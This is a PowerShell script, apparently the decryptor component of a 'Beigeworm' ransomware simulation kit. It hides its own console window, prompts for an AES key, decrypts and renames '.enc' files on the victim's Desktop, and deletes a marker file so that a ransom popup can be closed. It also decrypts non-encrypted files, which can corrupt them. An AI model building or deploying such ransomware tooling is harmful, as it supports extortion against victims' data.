<#=================================================== Beigeworm's File Decryptor =======================================================

SYNOPSIS
This script Decrypts all files within selected folders and allows the popup window to be closed.

**WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**

RUNNING THIS WITH THE WRONG KEY MAY PERMANENTLY DAMAGE THE FILES TO BE RECOVERED.

**WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   

USAGE
1. Run the script on target system.
2. Enter the Decryption Key when prompted.
3. Use the decryptor to decrypt the files.

#>

$Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
add-type -name win -member $Import -namespace native;
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);

Add-Type -AssemblyName System.Windows.Forms
$form = New-Object Windows.Forms.Form
$form.Text = "  BeigeTools | Decryptor 3000"
$form.Size = New-Object Drawing.Size(420, 320)
$form.BackColor = [System.Drawing.Color]::Black
$form.ForeColor = [System.Drawing.Color]::White
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog

$Text = New-Object Windows.Forms.Label
$Text.Text = "Decryption Key"
$Text.AutoSize = $true
$Text.Font = 'Microsoft Sans Serif,10'
$Text.Location = New-Object System.Drawing.Point(15, 20)
$Text.Font = 'Microsoft Sans Serif,10,style=Bold'

$keyBox = New-Object System.Windows.Forms.TextBox
$keyBox.Location = New-Object System.Drawing.Point(18, 47)
$keyBox.BackColor = "#eeeeee"
$keyBox.Width = 265
$keyBox.Text = ""
$keyBox.Multiline = $false
$keyBox.Font = 'Microsoft Sans Serif,10,style=Bold'

$Decrypt = New-Object Windows.Forms.Button
$Decrypt.Text = "Start"
$Decrypt.Width = 80
$Decrypt.Height = 30
$Decrypt.BackColor = [System.Drawing.Color]::White
$Decrypt.ForeColor = [System.Drawing.Color]::Black
$Decrypt.Location = New-Object System.Drawing.Point(305, 42)
$Decrypt.Font = 'Microsoft Sans Serif,10,style=Bold'

$OutputBox = New-Object System.Windows.Forms.TextBox 
$OutputBox.Multiline = $True;
$OutputBox.Location = New-Object System.Drawing.Size(15,90) 
$OutputBox.Width = 370
$OutputBox.Height = 170
$OutputBox.Scrollbars = "Vertical" 
$OutputBox.Font = 'Microsoft Sans Serif,10,style=Bold'

$form.Controls.AddRange(@($Text,$keyBox,$Decrypt,$OutputBox))

Function Add-OutputBoxLine{
    Param ($outfeed) 
    $OutputBox.AppendText("`r`n$outfeed")
    $OutputBox.Refresh()
    $OutputBox.ScrollToCaret()
}

$Decrypt.Add_Click{

# Define Folders to Decrypt 
$SourceFolder = "$env:USERPROFILE\Desktop" #,"$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive"
$files = Get-ChildItem -Path $SourceFolder -File -Recurse

# Ask for decryption Key
$KeyBase64 = $keyBox.Text

# Decryption setup
$IVBase64 = 'r7SbTffTMbMA4Zm70iHAwA=='
$KeyBytes = [System.Convert]::FromBase64String($KeyBase64)
$IVBytes = [System.Convert]::FromBase64String($IVBase64)

    if ($KeyBase64 -gt 0){
# Decrypt all files with the key
        Get-ChildItem -Path $SourceFolder -File -Recurse | ForEach-Object {
            $File = $_
            $Decryptor = [System.Security.Cryptography.Aes]::Create()
            $Decryptor.Key = $KeyBytes
            $Decryptor.IV = $IVBytes
            
            $Content = [System.IO.File]::ReadAllBytes($File.FullName)
            $DecryptedContent = $Decryptor.CreateDecryptor().TransformFinalBlock($Content, 0, $Content.Length)
        
            [System.IO.File]::WriteAllBytes($File.FullName, $DecryptedContent)
        }
        
# Loop through each file and rename it to remove ".enc" if it's at the end
        foreach ($file in $files) {
            $newName = $file.Name -replace "\.enc$", ""
            if ($newName -ne $file.Name) {
                $newPath = Join-Path -Path $SourceFolder -ChildPath $newName
                Rename-Item -Path $file.FullName -NewName $newName
                Add-OutputBoxLine -Outfeed "$File Restored!"
            }
        }
    
# Clean up and wait for user to close
    rm -Path "$env:tmp\indicate" -Force
    }
Add-OutputBoxLine -Outfeed "DECRYPTION COMPLETE!"
}

$form.ShowDialog()